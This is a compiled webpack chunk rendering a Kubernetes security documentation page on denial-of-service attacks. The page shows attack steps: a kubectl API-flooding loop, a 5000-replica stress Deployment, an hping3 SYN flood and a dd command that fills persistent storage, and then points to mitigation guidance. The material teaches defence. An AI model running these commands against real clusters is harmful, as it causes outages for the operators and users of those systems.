"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[5761],{5930:(e,s,t)=>{t.r(s),t.d(s,{assets:()=>c,contentTitle:()=>a,default:()=>u,frontMatter:()=>o,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"attack_vectors/ddos_attacks","title":"Denial of Service (DoS) Attacks","description":"How attackers exploit Kubernetes resources to exhaust system capacity, disrupt workloads, and cause service outages.","source":"@site/docs/attack_vectors/ddos_attacks.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/ddos_attacks","permalink":"/k8s_security/docs/attack_vectors/ddos_attacks","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/ddos_attacks.md","tags":[],"version":"current","sidebarPosition":13,"frontMatter":{"sidebar_position":13,"title":"Denial of Service (DoS) Attacks","description":"How attackers exploit Kubernetes resources to exhaust system capacity, disrupt workloads, and cause service outages."},"sidebar":"default","previous":{"title":"Misconfigured Admission Controllers","permalink":"/k8s_security/docs/attack_vectors/misconfigured_admission_controllers"},"next":{"title":"Privileged Service Accounts","permalink":"/k8s_security/docs/attack_vectors/privileged_service_accounts"}}');var n=t(4848),i=t(8453);const o={sidebar_position:13,title:"Denial of Service (DoS) Attacks",description:"How attackers exploit Kubernetes resources to exhaust system capacity, disrupt workloads, and cause service outages."},a="Denial of Service (DoS) Attacks",c={},l=[{value:"Exploitation Steps: Overloading Cluster Resources",id:"exploitation-steps-overloading-cluster-resources",level:2},{value:"Step 1: Flood the Kubernetes API Server",id:"step-1-flood-the-kubernetes-api-server",level:3},{value:"Step 2: Deploy Resource-Exhausting Pods",id:"step-2-deploy-resource-exhausting-pods",level:3},{value:"Step 3: Exploit Insecure Network Policies",id:"step-3-exploit-insecure-network-policies",level:3},{value:"Step 4: Abuse Persistent Storage",id:"step-4-abuse-persistent-storage",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,i.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(s.header,{children:(0,n.jsx)(s.h1,{id:"denial-of-service-dos-attacks",children:"Denial of Service (DoS) Attacks"})}),"\n",(0,n.jsxs)(s.p,{children:["A ",(0,n.jsx)(s.strong,{children:"Denial of Service (DoS) attack"})," targets a Kubernetes cluster by ",(0,n.jsx)(s.strong,{children:"exhausting system resources, overloading the API server, or overwhelming network capacity"}),". These attacks can cause ",(0,n.jsx)(s.strong,{children:"service downtime, degraded performance, and complete cluster unavailability"}),"."]}),"\n",(0,n.jsx)(s.hr,{}),"\n",(0,n.jsx)(s.h2,{id:"exploitation-steps-overloading-cluster-resources",children:"Exploitation Steps: Overloading Cluster Resources"}),"\n",(0,n.jsxs)(s.p,{children:["An attacker generates ",(0,n.jsx)(s.strong,{children:"excessive traffic, high CPU usage, or memory exhaustion"})," to disrupt Kubernetes workloads."]}),"\n",(0,n.jsx)(s.h3,{id:"step-1-flood-the-kubernetes-api-server",children:"Step 1: Flood the Kubernetes API Server"}),"\n",(0,n.jsxs)(s.p,{children:["An attacker repeatedly sends API requests to ",(0,n.jsx)(s.strong,{children:"overload the control plane"}),":"]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"while true; do kubectl get pods --all-namespaces; done\n"})}),"\n",(0,n.jsxs)(s.p,{children:["If ",(0,n.jsx)(s.strong,{children:"unauthenticated API access"})," is allowed, this can cause ",(0,n.jsx)(s.strong,{children:"latency spikes and request failures"}),"."]}),"\n",(0,n.jsx)(s.h3,{id:"step-2-deploy-resource-exhausting-pods",children:"Step 2: Deploy Resource-Exhausting Pods"}),"\n",(0,n.jsxs)(s.p,{children:["If ",(0,n.jsx)(s.strong,{children:"resource limits"})," are not enforced, the attacker deploys multiple high-consumption pods:"]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-yaml",children:'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: overload-pods\nspec:\n  replicas: 5000\n  template:\n    spec:\n      containers:\n        - name: stress-container\n          image: polinux/stress\n          command: ["stress"]\n          args:\n            [\n              "--cpu",\n              "4",\n              "--io",\n              "4",\n              "--vm",\n              "4",\n              "--vm-bytes",\n              "128M",\n              "--timeout",\n              "300s",\n            ]\n'})}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"kubectl apply -f overload-pods.yaml\n"})}),"\n",(0,n.jsxs)(s.p,{children:["Without ",(0,n.jsx)(s.strong,{children:"Pod Resource Limits"}),", the cluster experiences ",(0,n.jsx)(s.strong,{children:"CPU and memory starvation"}),"."]}),"\n",(0,n.jsx)(s.h3,{id:"step-3-exploit-insecure-network-policies",children:"Step 3: Exploit Insecure Network Policies"}),"\n",(0,n.jsxs)(s.p,{children:["If ",(0,n.jsx)(s.strong,{children:"network policies"})," are missing, the attacker floods a Kubernetes Service with ",(0,n.jsx)(s.strong,{children:"large requests"}),":"]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"hping3 -S -p 443 <service-ip> --flood\n"})}),"\n",(0,n.jsxs)(s.p,{children:["This ",(0,n.jsx)(s.strong,{children:"overwhelms"})," the target service, causing delays and timeouts."]}),"\n",(0,n.jsx)(s.h3,{id:"step-4-abuse-persistent-storage",children:"Step 4: Abuse Persistent Storage"}),"\n",(0,n.jsxs)(s.p,{children:["If ",(0,n.jsx)(s.strong,{children:"storage quotas"})," are missing, the attacker fills up available storage:"]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"dd if=/dev/zero of=/mnt/persistent-volume/attack bs=1M count=100000\n"})}),"\n",(0,n.jsxs)(s.p,{children:["Once storage reaches ",(0,n.jsx)(s.strong,{children:"100% capacity"}),", workloads that rely on persistence ",(0,n.jsx)(s.strong,{children:"fail or crash"}),"."]}),"\n",(0,n.jsx)(s.h3,{id:"result",children:"Result"}),"\n",(0,n.jsxs)(s.p,{children:["The attacker successfully ",(0,n.jsx)(s.strong,{children:"disrupts Kubernetes services"}),", leading to ",(0,n.jsx)(s.strong,{children:"downtime, increased latency, and operational failures"}),"."]}),"\n",(0,n.jsx)(s.hr,{}),"\n",(0,n.jsx)(s.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,n.jsxs)(s.p,{children:["To protect against ",(0,n.jsx)(s.strong,{children:"Denial of Service (DoS) attacks"}),", follow the security best practices outlined in:"]}),"\n",(0,n.jsxs)(s.p,{children:["\u27a1 ",(0,n.jsx)(s.strong,{children:(0,n.jsx)(s.a,{href:"/docs/best_practices/cluster_setup_and_hardening/network_security/ddos_mitigation",children:"Mitigating DoS Attacks in Kubernetes"})})]}),"\n",(0,n.jsxs)(s.p,{children:["This guide covers techniques such as ",(0,n.jsx)(s.strong,{children:"rate limiting, API request quotas, network policy enforcement, resource limits, and autoscaling defenses"})," to prevent Kubernetes disruptions."]})]})}function u(e={}){const{wrapper:s}={...(0,i.R)(),...e.components};return s?(0,n.jsx)(s,{...e,children:(0,n.jsx)(d,{...e})}):d(e)}},8453:(e,s,t)=>{t.d(s,{R:()=>o,x:()=>a});var r=t(6540);const n={},i=r.createContext(n);function o(e){const s=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:o(e.components),r.createElement(i.Provider,{value:s},e.children)}}}]);